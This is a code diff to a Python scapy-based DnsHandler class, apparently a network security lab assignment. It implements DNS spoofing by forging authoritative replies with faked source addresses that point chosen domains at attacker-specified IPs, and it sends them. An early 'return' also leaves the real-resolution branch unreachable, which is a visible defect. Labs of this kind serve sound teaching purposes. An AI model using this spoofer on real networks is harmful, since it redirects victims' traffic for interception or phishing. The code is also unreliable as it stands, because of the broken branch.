@@ -142,7 +142,7 @@ class DnsHandler(object):
         dns_response = sr1(dns_request, timeout=2)
         if dns_response:
             response_pkt = IP(src=dst, dst=src)/UDP(sport=dst_port, dport = src_port)/dns_response[DNS]
-            send(response_pkt)
+            return response_pkt
 
     def get_spoofed_dns_response(self, pkt: scapy.packet.Packet, to: str) -> scapy.packet.Packet:
         """
@@ -153,7 +153,19 @@ class DnsHandler(object):
         @param to ip address to return from the DNS lookup.
         @return fake DNS response to the request.
         """
-        pass
+        src_ip, dst_ip = pkt[IP].src, pkt[IP].dst
+        src_port, dst_port = pkt[UDP].sport, pkt[UDP].dport
+        qname = pkt[DNS].qd.qname
+        dns = DNS(
+            id=pkt[DNS].id,
+            qr=1,
+            aa=1,
+            qd=pkt[DNS].qd,
+            ancount=1,
+            an=DNSRR(rrname=qname, ttl=300, rdata=to)
+        )
+        response_pkt = IP(src=dst_ip, dst=src_ip)/UDP(sport=dst_port, dport=src_port)/dns
+        return response_pkt
 
     def resolve_packet(self, pkt: scapy.packet.Packet) -> str:
         """
@@ -164,7 +176,19 @@ class DnsHandler(object):
         @param pkt DNS request from target.
         @return string describing the choice made
         """
-        pass
+        qname = pkt[DNS].qd.qname
+        qname=qname[:-1]
+        keys = list(self.spoof_dict.keys())
+        if qname in keys:
+            #print(qname)
+            response = self.get_spoofed_dns_response(pkt, self.spoof_dict[qname])
+            send(response)
+            return('spoofed')
+        else:
+            return
+            response = self.get_real_dns_response(pkt)
+            send(response)
+            return('not spoofed')
 
     def run(self) -> None:
         """
@@ -183,7 +207,7 @@ class DnsHandler(object):
         """
         Starts the DNS server process.
         """
-        print('starting server')
+        #print('starting server')
         p = mp.Process(target=self.run)
         self.process = p
         self.process.start()
